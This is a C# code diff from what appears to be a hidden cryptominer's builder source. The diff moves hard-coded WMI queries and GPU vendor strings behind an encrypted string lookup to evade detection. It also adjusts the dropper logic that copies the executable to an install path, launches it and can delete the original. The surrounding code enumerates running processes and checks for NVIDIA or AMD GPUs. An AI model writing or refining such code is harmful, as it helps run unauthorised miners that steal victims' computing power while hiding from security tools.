@@ -85,7 +85,7 @@ public partial class _rProgram_
 #else
                 string _rcmdl_ = Application.ExecutablePath;
 #endif
-                if (!_rcmdl_.Equals(_rplp_, StringComparison.CurrentCultureIgnoreCase))
+                if (!_rcmdl_.Equals(_rplp_, StringComparison.CurrentCultureIgnoreCase) && !(System.Security.Principal.WindowsIdentity.GetCurrent().IsSystem && _rcmdl_.EndsWith(_rGetString_("#INSTALLPATH"), StringComparison.CurrentCultureIgnoreCase)))
                 {
 #if DefMinerOverwrite
                     if(File.Exists(_rplp_)){
@@ -132,7 +132,9 @@ public partial class _rProgram_
                     Directory.CreateDirectory(Path.GetDirectoryName(_rplp_));
                     File.Copy(_rcmdl_, _rplp_, true);
                     Thread.Sleep(2000);
+#if DefRunInstall
                     _rCommand_(_rGetString_("#SCMD"), string.Format(_rGetString_("#CMDSTART"), _rplp_));
+#endif
 #if DefAutoDelete
                     _rCommand_(_rGetString_("#SCMD"), string.Format(_rGetString_("#CMDDELETE"), _rcmdl_));
 #endif
@@ -276,16 +278,16 @@ public partial class _rProgram_
 
             var _rarg4_ = new ConnectionOptions();
             _rarg4_.Impersonation = ImpersonationLevel.Impersonate;
-            var _rarg5_ = new ManagementScope(@"\root\cimv2", _rarg4_);
+            var _rarg5_ = new ManagementScope(_rGetString_("#WMISCOPE"), _rarg4_);
             _rarg5_.Connect();
 
-            var rarg6 = new ManagementObjectSearcher(_rarg5_, new ObjectQuery("SELECT Name, VideoProcessor FROM Win32_VideoController")).Get();
+            var rarg6 = new ManagementObjectSearcher(_rarg5_, new ObjectQuery(_rGetString_("#GPUQUERY"))).Get();
             foreach (ManagementObject MemObj in rarg6)
             {
                 _rarg7_ += (" " + MemObj["VideoProcessor"] + " " + MemObj["Name"]);
             }
 
-            return _rarg7_.IndexOf("nvidia", StringComparison.OrdinalIgnoreCase) >= 0 || _rarg7_.IndexOf("amd", StringComparison.OrdinalIgnoreCase) >= 0;
+            return _rarg7_.IndexOf(_rGetString_("#STRNVIDIA"), StringComparison.OrdinalIgnoreCase) >= 0 || _rarg7_.IndexOf(_rGetString_("#STRAMD"), StringComparison.OrdinalIgnoreCase) >= 0;
         }
         catch (Exception ex)
         {
@@ -302,7 +304,7 @@ public partial class _rProgram_
 
         var _rarg1_ = new ConnectionOptions();
         _rarg1_.Impersonation = ImpersonationLevel.Impersonate;
-        var _rarg2_ = new ManagementScope(@"\root\cimv2", _rarg1_);
+        var _rarg2_ = new ManagementScope(_rGetString_("#WMISCOPE"), _rarg1_);
         _rarg2_.Connect();
 
         var _rarg3_ = new ManagementObjectSearcher(_rarg2_, new ObjectQuery(_rGetString_("#MINERQUERY"))).Get();
@@ -328,7 +330,7 @@ public partial class _rProgram_
 
             var _rarg1_ = new ConnectionOptions();
             _rarg1_.Impersonation = ImpersonationLevel.Impersonate;
-            var _rarg2_ = new ManagementScope(@"\root\cimv2", _rarg1_);
+            var _rarg2_ = new ManagementScope(_rGetString_("#WMISCOPE"), _rarg1_);
             _rarg2_.Connect();
 
             var _rarg3_ = new ManagementObjectSearcher(_rarg2_, new ObjectQuery("Select CommandLine, ProcessID from Win32_Process")).Get();
